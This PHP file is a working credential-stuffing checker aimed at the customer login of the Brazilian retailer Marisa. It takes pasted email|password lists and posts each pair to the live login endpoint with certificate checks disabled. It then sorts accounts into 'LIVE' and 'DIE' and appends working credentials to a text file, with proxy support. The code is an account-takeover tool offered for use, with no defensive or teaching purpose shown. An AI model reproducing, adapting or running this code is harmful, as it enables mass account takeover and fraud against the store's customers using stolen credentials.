<?php include '../../dbc.php';page_protect();?><?php$sock = '';error_reporting(0);function getStr($string,$start,$end){	$str = explode($start,$string);	$str = explode($end,$str[1]);	return $str[0];}class cURL {    var $callback = false;    function setCallback($func_name) {        $this->callback = $func_name;    }    function doRequest($method, $url) {        $ch = curl_init();		global $email, $pwd , $token;        curl_setopt($ch, CURLOPT_URL, $url);        curl_setopt($ch, CURLOPT_HEADER, 1);        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']); // RADOM DOS NAVEGADORES        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);		curl_setopt($ch, CURLOPT_COOKIESESSION, false);        curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/MARISA.txt'); //COOKIES  DO NAVEGADOR        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/MARISA.txt'); //COOKIES DO NAVEGADOR		curl_setopt($ch, CURLOPT_REFERER, 'https://www.marisa.com.br/cliente/login?ReturnUrl=/'); //REFERER DA SEGUNDA CHAMADO        curl_setopt($ch, CURLOPT_VERBOSE, 1);        if ($method == 'POST') {            curl_setopt($ch, CURLOPT_POST, 0);            curl_setopt($ch, CURLOPT_POSTFIELDS, 'Login='.$email.'&Senha='.$pwd.'&Login=Entrar'); //POST DO LIVE REQUESST           // curl_setopt($ch, CURLOPT_POSTFIELDS, '__VIEWSTATE=%2FwEPDwUJNzQzMDI3MTA5DxYEHg52c1JlZGlyZWNpb25hcmceCXZzYmFja1VSTAUXL3VzdWFyaW8vTWV1c0RhZG9zLmFzcHgWAmYPDxYCHg12c2FycXVpdm9zQ1NTBa8BPGxpbmsgaHJlZj0iL2luY2x1ZGVzL2Nzc19vbGQvbXJzMTMtY2FyLXRlbXBsYXRlLmNzcyIgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIgLz48bGluayBocmVmPSIvaW5jbHVkZXMvY3NzX29sZC9tcnMxMy1jYXItbG9naW4uY3NzIiByZWw9InN0eWxlc2hlZXQiIHR5cGU9InRleHQvY3NzIiAvPmQWCAIBD2QWCAICDxYCHgRUZXh0BcgHPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIHNyYz0iL2luY2x1ZGVzL2pzX29sZC9qcXVlcnktMS43LjIubWluLmpzIj48L3NjcmlwdD48c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSIvaW5jbHVkZXMvanNfb2xkL2pxdWVyeS50aW55c2Nyb2xsYmFyLm1pbi5qcyI%2BPC9zY3JpcHQ%2BPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIHNyYz0iL2luY2x1ZGVzL2pzX29sZC9qcXVlcnkuanF6b29tLWNvcmUuanMiPjwvc2NyaXB0PjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0IiBzcmM9Ii9pbmNsdWRlcy9qc19vbGQvanNvbjIuanMiPjwvc2NyaXB0PjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0IiBzcmM9Ii9pbmNsdWRlcy9qc19vbGQvanF1ZXJ5LnJldmVhbC5qcyI%2BPC9zY3JpcHQ%2BPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIHNyYz0iL2luY2x1ZGVzL2pzX29sZC9mdW5jb2VzR2VyYWlzLmpzIj48L3NjcmlwdD48c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSIvaW5jbHVkZXMvanNfb2xkL2pxdWVyeS5qY2Fyb3VzZWwubWluLmpzIj48L3NjcmlwdD48c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSIvaW5jbHVkZXMvanNfb2xkL2pxdWVyeS5kYXRlcGlja2VyLW1pbi5qcyI%2BPC9zY3JpcHQ%2BPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIHNyYz0iL2luY2x1ZGVzL2pzX29sZC9qc0dsb2JhbC1taW4uanMiIGNoYXJzZXQ9InV0Zi04Ij48L3NjcmlwdD48c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSIvaW5jbHVkZXMvanNfb2xkL21yczEzLWNhci1mdW5jb2VzLW1pbi5qcz9kYXRhPTMwLzA1LzIwMTUgMDk6NDU6MDUiPjwvc2NyaXB0PjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0IiBzcmM9Ii8vd3d3Lmdvb2dsZWFkc2VydmljZXMuY29tL3BhZ2VhZC9jb252ZXJzaW9uLmpzIj48L3NjcmlwdD5kAgMPFgIfAwWvATxsaW5rIGhyZWY9Ii9pbmNsdWRlcy9jc3Nfb2xkL21yczEzLWNhci10ZW1wbGF0ZS5jc3MiIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIC8%2BPGxpbmsgaHJlZj0iL2luY2x1ZGVzL2Nzc19vbGQvbXJzMTMtY2FyLWxvZ2luLmNzcyIgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIgLz5kAgUPFgIfAwWzAjxzY3JpcHQgYXN5bmMgZGVmZXIgc3JjPScvL3N0YXRpYy5jaGFvcmRpY3N5c3RlbXMuY29tL3N0YXRpYy9sb2FkZXIuanMnIGRhdGEtYXBpa2V5PSdtYXJpc2EnPjwvc2NyaXB0Pg0KICAgPHNjcmlwdCB0eXBlPSd0ZXh0L2phdmFzY3JpcHQnPg0KICAgICAgIHdpbmRvdy5jaGFvcmRpY19tZXRhID0gew0KICAgICAgICAgICAncGFnZSc6IHsNCiAgICAgICAgICAgICAgICduYW1lJzogJ2NoZWNrb3V0JywNCiAgICAgICAgICAgICAgICd0aW1lc3RhbXAnOiBuZXcgRGF0ZSgpIA0KICAgICAgICAgICAgICAgfQ0KfQ0KICAgPC9zY3JpcHQ%2BDQpkAgcPFgIfA2VkAgUPZBYCAgEPFgIfAwU9PGRpdiBjbGFzcz0iYm5lci1jYXRlZ29yaWEtZnVsbCIgc3R5bGU9InRleHQtYWxpZ246Y2VudGVyOyIgPmQCBw8WAh8DBbgCPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPnZhciByYWt1dGVuU01fc3RvcmVDb2RlPSIyNTRjYWY0ZS01ZWFkLTQ1ODktYTQzZS1jNjZjM2VhZWUyN2UiOyB2YXIgcmFrdXRlblNNX3Nlc3Npb25JZD0iIjsgdmFyIHJha3V0ZW5TTV9jdXN0b21lckVtYWlsPSIiOyB2YXIgcmFrdXRlblNNX3BhcnRuZXI9IiI7PC9zY3JpcHQ%2BPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIHNyYz0iaHR0cHM6Ly9zZWd1cm8ucmFrdXRlbi5jb20uYnIvcmVzb3VyY2VzL2pzL2NvbnRyb2xsZXItc3VwZXJtYWxsL3N1cGVybWFsbC5qcyI%2BPC9zY3JpcHQ%2BZAILDxYCHwMFpAE8IS0tTWF4eW1pc2VyIHNjcmlwdCBzdGFydCAtLT4NCjxzY3JpcHQgdHlwZT0ndGV4dC9qYXZhc2NyaXB0JyBzcmM9Jy8vc2VydmljZS5tYXh5bWlzZXIubmV0L2Nkbi9wYWt1YS9tYXJpc2EvanMvbW1jb3JlLmpzJz48L3NjcmlwdD4NCjwhLS1NYXh5bWlzZXIgc2NyaXB0IGVuZCAtLT4NCmRkMnAdXBuTyYe6Tng5GvUV%2FZihDgw%3D&__VIEWSTATEGENERATOR=877417C2&__EVENTVALIDATION=%2FwEWBwKmo8OvAQKa%2F7ScBALs%2FIvoAgLU2vbjAgKPpKnOAQLS1r%2B7CALelvTzD527j1kWAUnoVOOiIdjnPJYO9L6S&ctl00%24ContentPlaceHolder1%24txtLoginTenho='.$email.'&ctl00%24ContentPlaceHolder1%24txtSenhaTenho='.$pwd.'&ctl00%24ContentPlaceHolder1%24btnTenhoCadastro=CONTINUAR&ctl00%24ContentPlaceHolder1%24txtEmailNaoTenho=&ctl00%24ContentPlaceHolder1%24txtCEPNaoTenho='); //POST DO LIVE REQUESST                }       $data = curl_exec($ch); //AQUI PRA VER AS PAGINAS DE RESULTADO        curl_close($ch);        if ($data) {            if ($this->callback) {                $callback = $this->callback;                $this->callback = false;                return call_user_func($callback, $data);            } else {                return $data;            }        } else {            return curl_error($ch);        }    }    function get($url) {        return $this->doRequest('GET', $url, 'NULL');    }    function post($url) {        return $this->doRequest('POST', $url);    }}echo '<DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><head><title>MARISA</title></head><style>			body		{			background-color: #FFD777;			font-size: 9pt;			font-family:Verdana;			line-height:12pt;			color: #FFFFFF;		}			body,td,th {			color: #FFFFFF;		}		h2		{			color: #FFFFFF;		}		h1 {			padding: 10px 15px;			color: red;		}		.main-content {				width: 70%; height: 380px;margin: auto; background: #FFFFFF;      border-radius: 5px 5px 5px 5px; box-shadow: 0 0 3px rgba(0, 0, 0, 0.5); min-height: 380px;      position: relative;		}		textarea, input {				border-radius: 5px 5px 5px 5px;		}		input {				height: 14px;width: 30px;text-align: center;o		}								.button {			   		}		.submit-button				{						background: #FFD777;						border:solid 1px #FFD777;						border-radius:5px;								-moz-border-radius: 5px;								-webkit-border-radius: 5px;						-moz-box-shadow: 0 1px 3px rgba(0,0,0,0.6);						-webkit-box-shadow: 0 1px 3px rgba(0,0,0,0.6);						text-shadow: 0 -1px 1px rgba(0,0,0,0.25);						border-bottom: 1px solid rgba(0,0,0,0.25);						position: relative;						color:#FFF;						display: inline-block;						cursor:pointer;						font-size:13px;						padding:3px 8px;						height: 30px;width: 120px;				}        .submit-button:hover {        background:#82D051;border:solid 1px #86CC50;        height: 30px;width: 120px;      } 		#show {				width: 70%;margin: auto;padding: 10px 10px;		}		.business{			font-weight:bold;			color:yellow;		}		.premier{			font-weight:bold;			color:#00FF00;		}		.verified{			font-weight:bold;			color:#006DB0;		}		.fieldset{			border: 1px dashed #FFFFFF;			margin-top: 20px;		}		.tvmit_live{			border: 1px dashed #FFFFFF;			color:yellow;			font-weight:bold;		}		.tvmit_die{			border: 1px dashed #FFFFFF;			color:red;			font-weight:bold;		}		#result{			display:none;		}	</style>    <script type="text/javascript">        function pushPaypalDie(str){            document.getElementById(\'listPaypalDie\').innerHTML += \'<div>\' + str + \'</div>\';        }        function pushPaypal(str){            document.getElementById(\'listPaypal\').innerHTML += \'<div>\' + str + \'</div>\';        }        function pushWrongFormat(str){            document.getElementById(\'listWrongFormat\').innerHTML += \'<div>\' + str + \'</div>\';        }    </script></head><body><div class="main-content"><center><h1>MARISA</h1></center><form method="post"><div align="center"><textarea name="mp" rows="10" style="width:90%">';if (isset($_POST['btn-submit']))    echo $_POST['mp'];else    echo 'EMAIL|SENHA';;echo '</textarea><br />SEPARADOR: <input type="text" name="delim" value="';if (isset($_POST['btn-submit']))    echo $_POST['delim'];else    echo '|';;echo '" size="1" /><input type="hidden" name="mail" value="';if (isset($_POST['btn-submit']))    echo $_POST['mail'];else    echo 0;;echo '" size="1" /><input type="hidden" name="pwd" value="';if (isset($_POST['btn-submit']))    echo $_POST['pwd'];else    echo 1;;echo '" size="1" />&nbsp;<br/><br/><input type="submit" class = "submit-button" value="CHECAR" name="btn-submit" /> </br>&nbsp;&nbsp;&nbsp;&nbsp;</div></form>';set_time_limit(0);include("use.php");function fetch_value($str, $find_start, $find_end) {    $start = strpos($str, $find_start);    if ($start === false) {        return "";    }    $length = strlen($find_start);    $end = strpos(substr($str, $start + $length), $find_end);    return trim(substr($str, $start + $length, $end));}function fetch_value_notrim($str, $find_start, $find_end) {    $start = strpos($str, $find_start);    if ($start === false) {        return "";    }    $length = strlen($find_start);    $end = strpos(substr($str, $start + $length), $find_end);    return substr($str, $start + $length, $end);}$dir = dirname(__FILE__);$config['cookie_file'] = $dir . '/cookies/' . md5($_SERVER['REMOTE_ADDR']) . '.txt';if (!file_exists($config['cookie_file'])) {    $fp = @fopen($config['cookie_file'], 'w');    @fclose($fp);}$zzz = "";$live = array();function get($list) {    preg_match_all("/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}/", $list, $socks);    return $socks[0];}function delete_cookies() {    global $config;    $fp = @fopen($config['cookie_file'], 'w');    @fclose($fp);}function xflush() {    static $output_handler = null;    if ($output_handler === null) {        $output_handler = @ini_get('output_handler');    }     if ($output_handler == 'ob_gzhandler') {        return;    }	    flush();    if (function_exists('ob_flush') AND function_exists('ob_get_length') AND ob_get_length() !== false) {        @ob_flush();    } else if (function_exists('ob_end_flush') AND function_exists('ob_start') AND function_exists('ob_get_length') AND ob_get_length() !== FALSE) {        @ob_end_flush();        @ob_start();    }}function curl_grab_page($site,$proxy,$proxystatus){	$chss = curl_init();	curl_setopt($chss, CURLOPT_RETURNTRANSFER, TRUE);	if ($proxystatus == 'on') {				curl_setopt($chss, CURLOPT_SSL_VERIFYHOST, FALSE);				curl_setopt($chss, CURLOPT_HTTPPROXYTUNNEL, TRUE);				curl_setopt($chss, CURLOPT_PROXY, $proxy);			}			curl_setopt($chss, CURLOPT_COOKIEFILE, "cookie.txt");			curl_setopt($chss, CURLOPT_URL, $site);			return curl_exec($chss);			curl_close ($chss);			}function display($str) {    echo '<div>' . $str . '</div>';    xflush();}//function pushSockDie($str) {   // echo '<script type="text/javascript">pushSockDie(\'' . $str . '\');</script>';  //  xflush();//}function pushPaypalDie($str) {    echo '<script type="text/javascript">pushPaypalDie(\'' . $str . '\');</script>';	file_put_contents('api/accountsdead.txt', $str . PHP_EOL, FILE_APPEND);      xflush();}function pushPaypal($str) {    echo '<script type="text/javascript">pushPaypal(\'' . $str . '\');</script>';	file_put_contents('api/accounts.txt', $str . PHP_EOL, FILE_APPEND);      xflush();}function pushWrongFormat($str) {    echo '<script type="text/javascript">pushWrongFormat(\'' . $str . '\');</script>';    xflush();}if (isset($_POST['btn-submit'])) {    ;    echo '<br/><br/><br/><br/><br/><br/><br/><legend class="tvmit_live">LIVE:<br/><div id="listPaypal"></div></legend><br/><legend class="tvmit_die">DIE:<br/><div id="listPaypalDie"></div></legend><br/><legend class="tvmit_die">INVALIDAS: <br/><div id="listWrongFormat"></div></legend>';    xflush();    $emails = explode("\n", trim($_POST['mp']));    $eCount = count($emails);    $failed = $live = $uncheck = array();    $checked = 0;    if (!count($emails)) {        continue;    }    delete_cookies();    //$sockClear = isSockClear();    //if ($sockClear != 1) {        //pushSockDie('[<font color="#FF0000">' . $sock . '</font>]');        //continue;    //}    foreach ($emails AS $k => $line) {        $info = explode($_POST['delim'], $line);        $email = trim($info["{$_POST['mail']}"]);        $pwd = trim($info["{$_POST['pwd']}"]);        if (stripos($email, '@') === false || strlen($pwd) < 2) {            unset($emails[$k]);            pushWrongFormat($email . ' | ' . $pwd);            continue;        }        //if ($failed[$sock] > 4)         //   continue;	 	 	 //DELETAR COOKIESif(file_exists(getcwd().'/MARISA.txt')) {        unlink(getcwd().'/MARISA.txt');     }	//FIM COOKIES		//CHAMADAS DE TOKEN E POST	//$a = new cURL();    //$b = $a->get("https://checkout.MARISA.com.br/Login/Entrar?returnUrl=%2FMeusEnderecos");//CHAMADA TOKEN    //$token = getStr($b,'type="hidden" name="dps" value="','"'); //CHAMADA TOKEN	$c = new cURL();    $d = $c->post("https://www.marisa.com.br/cliente/login?ReturnUrl=%2F"); //POST DA 2 CHAMADA        $checked++; 	if($d){		//RESULTADOS DE CAPUTRA		if (stristr($d,'marisa.cliente') !== false) {			     	//$cc = strip_tags($d,'<div class="fEndDesc">','</div>');			//$cc = strip_tags($cc);           // $cc = str_replace("\n", "", $cc);			$end = getStr($d,'id="ctl00_ContentPlaceHolder1_rptEnderecoCadastro_ctl01_lblEndereco">','</span>');						$xyz = "<b style=\"color:green\">Live</b> =>  <b style=\"color:white\" >$email | $pwd<b/> | <b style=\"color:red\">#TechnologyChecker</b> ";            $live[] = $xyz;            unset($emails[$k]);            pushPaypal($xyz);						}			else{											pushPaypalDie("<b style=\"color:red\">Die</b> => | <b style=\"color:Gray11\" >$email<b> | $pwd ");							unset($emails[$k]);							 			}        	}	}}//if (isset($eCount, $live)) {//    display("<h3>Total: $eCount - Testado: $checked - Aprovado: " . count($live) . "</h5>");//    display(implode("<br />", $live));    if (count($emails)) {        display("Sem Testar:");        display('<textarea cols="80" rows="10">' . implode("\n", $emails) . '</textarea>');    }echo '</body></html>';